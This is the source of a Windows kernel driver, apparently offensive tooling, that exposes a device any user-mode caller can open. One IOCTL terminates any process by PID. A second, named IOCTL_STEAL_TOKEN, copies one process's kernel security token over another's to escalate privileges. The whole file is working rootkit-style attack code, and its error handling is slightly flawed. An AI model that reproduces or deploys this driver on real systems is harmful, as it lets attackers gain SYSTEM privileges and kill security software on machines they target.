#include <stdio.h>
#include <ntifs.h>
#include "driver_utils.h"

#define IOCTL_STOP_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

UNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L"\\Device\\WindowsDriver");
UNICODE_STRING DEVICE_SYMBOLIC_NAME = RTL_CONSTANT_STRING(L"\\??\\WindowsDriverLink");

extern "C" void DriverUnload(PDRIVER_OBJECT dob)
{
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Driver unloaded, deleting symbolic links and devices");
	IoDeleteDevice(dob->DeviceObject);
	IoDeleteSymbolicLink(&DEVICE_SYMBOLIC_NAME);
}


extern "C" NTSTATUS HandleCustomIOCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
/*
	* METHOD_BUFFERED
	*
	* Input Buffer = Irp->AssociatedIrp.SystemBuffer
	* Ouput Buffer = Irp->AssociatedIrp.SystemBuffer
	*
	* Input Size = Parameters.DeviceIoControl.InputBufferLength
	* Output Size = Parameters.DeviceIoControl.OutputBufferLength
	*
	* Since they both use the same location
	* so the "buffer" allocated by the I/O
	* manager is the size of the larger value (Output vs. Input)
*/
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
	PIO_STACK_LOCATION stackLocation = NULL;
	CHAR msg[2048];
	
	stackLocation = IoGetCurrentIrpStackLocation(Irp);

	switch (stackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_STOP_PROCESS:
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IOCTL_STOP_PROCESS (0x%x) issued", stackLocation->Parameters.DeviceIoControl.IoControlCode);

		// get process id
		unsigned short pid = *(unsigned short*)Irp->AssociatedIrp.SystemBuffer;
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Received PID from userland: %d", *(unsigned short*)Irp->AssociatedIrp.SystemBuffer);

		// open process by process id
		CLIENT_ID cid1 = { (HANDLE)pid,  0 };
		OBJECT_ATTRIBUTES attr;
		HANDLE hProcess = 0;
		InitializeObjectAttributes(&attr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
		NtStatus = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &attr, &cid1);
		if (NtStatus == STATUS_SUCCESS)
		{
			// terminate process
			NtStatus = ZwTerminateProcess(hProcess, 0);
			if (NtStatus == STATUS_SUCCESS)
			{
				ZwClose(hProcess);
				sprintf(msg, "Process has been stoped! Status 0x%x", NtStatus);
			}
			else sprintf(msg, "Process hasn't been stoped! Status 0x%x", NtStatus);
		}
		else sprintf(msg, "Process hasn't been opened! Status 0x%x", NtStatus);
		break;
	}
	case IOCTL_STEAL_TOKEN:
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IOCTL_STEAL_TOKEN (0x%x) issued", stackLocation->Parameters.DeviceIoControl.IoControlCode);
		
		// get target pid & source pid
		union Data
		{
			unsigned short out[2];
			unsigned int in;
		};
		Data input_data{ 0 };
		input_data.in = *(unsigned int*)Irp->AssociatedIrp.SystemBuffer;
		
		unsigned short TARGET_PID = input_data.out[0], SOURCE_PID = input_data.out[1];
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Received PIDs from userland: Target %d Source %d", TARGET_PID, SOURCE_PID);

		PEPROCESS sourceProcess, targetProcess;
		//NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
		ULONG tokenOffset = get_token_offset_eprocess();

		// Lookup target process
		NtStatus = PsLookupProcessByProcessId(ULongToHandle(TARGET_PID), &targetProcess);
		if (NtStatus != STATUS_SUCCESS)
		{
			sprintf(msg, "Target process (PID %d) not found!", TARGET_PID);
			ObDereferenceObject(targetProcess);
			break;
		}

		// Lookup source process
		NtStatus = PsLookupProcessByProcessId(ULongToHandle(SOURCE_PID), &sourceProcess);
		if (NtStatus != STATUS_SUCCESS)
		{
			sprintf(msg, "Source process (PID %d) not found!", SOURCE_PID);
			ObDereferenceObject(sourceProcess);
			ObDereferenceObject(targetProcess);
			return NtStatus;
		}

		// Replace target process token with source process token
		*(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)sourceProcess + tokenOffset);
		sprintf(msg, "Token has stolen from Source (PID %d) to Target (PID %d)!", SOURCE_PID, TARGET_PID);

		ObDereferenceObject(sourceProcess);
		ObDereferenceObject(targetProcess);
		NtStatus = STATUS_SUCCESS;
		break;
	}
	default: break;
	}

	// send out message
	size_t dwDataSize = strlen(msg);
	if (stackLocation->Parameters.DeviceIoControl.OutputBufferLength
		>= dwDataSize)
	{
		/*
		* We use "RtlCopyMemory" in the kernel instead of memcpy.
		* RtlCopyMemory *IS* memcpy, however it's best to use the
		* wrapper in case this changes in the future.
		*/
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Sending to userland: %s", msg);
		RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, msg, dwDataSize);
		Irp->IoStatus.Information = dwDataSize;
	}
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Buffer is too small, need: %d", dwDataSize);
		Irp->IoStatus.Information = dwDataSize;
		NtStatus = STATUS_BUFFER_TOO_SMALL;
	}

	IoCompleteRequest(Irp, IO_NO_INCREMENT);	
	return NtStatus;
}

extern "C" NTSTATUS MajorFunctions(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	PIO_STACK_LOCATION stackLocation = NULL;
	stackLocation = IoGetCurrentIrpStackLocation(Irp);
	switch (stackLocation->MajorFunction)
	{
	case IRP_MJ_CREATE:
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Handle to symbolink link %wZ opened", DEVICE_SYMBOLIC_NAME);
		break;
	}
	case IRP_MJ_CLOSE:
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Handle to symbolink link %wZ closed", DEVICE_SYMBOLIC_NAME);
		break;
	}
	default:
	{
		break;
	}
	}

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status = 0;
	
	// routine that will execute when our driver is unloaded/service is stopped
	DriverObject->DriverUnload = DriverUnload;

	// routine for handling IO requests from userland
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleCustomIOCTL;

	// routines that will execute once a handle to our device's symbolik link is opened/closed
	DriverObject->MajorFunction[IRP_MJ_CREATE] = MajorFunctions;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = MajorFunctions;

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Driver loaded");
	
	IoCreateDevice(DriverObject, 0, &DEVICE_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DriverObject->DeviceObject);
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Could not create device %wZ", DEVICE_NAME);
	}
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Device %wZ created", DEVICE_NAME);
	}
	
	status = IoCreateSymbolicLink(&DEVICE_SYMBOLIC_NAME, &DEVICE_NAME);
	if (NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Symbolic link %wZ created", DEVICE_SYMBOLIC_NAME);
	}
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Error creating symbolic link %wZ", DEVICE_SYMBOLIC_NAME);
	}

	return STATUS_SUCCESS;
}